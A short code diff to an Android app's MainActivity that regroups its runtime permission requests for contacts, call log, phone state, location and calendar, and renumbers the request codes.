@@ -85,9 +85,6 @@ public class MainActivity extends Activity {
             case 401:
                 requestPermissions();
                 break;
-            case 501:
-                requestPermissions();
-                break;
             default:
                 break;
         }
@@ -100,19 +97,15 @@ public class MainActivity extends Activity {
             return null;
         }
         if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.READ_PHONE_NUMBERS, Manifest.permission.READ_PHONE_STATE}, 201);
+            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_NUMBERS, Manifest.permission.READ_PHONE_STATE}, 201);
             return null;
         }
         if(checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED){
             requestPermissions(new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 301);
             return null;
         }
-        if(checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED){
-            requestPermissions(new String[]{Manifest.permission.READ_CALL_LOG}, 401);
-            return null;
-        }
         if(checkSelfPermission(Manifest.permission.READ_CALENDAR) != PackageManager.PERMISSION_GRANTED){
-            requestPermissions(new String[]{Manifest.permission.READ_CALENDAR}, 501);
+            requestPermissions(new String[]{Manifest.permission.READ_CALENDAR}, 401);
             return null;
         }
         if (!MessagingService.sIsRunning) {
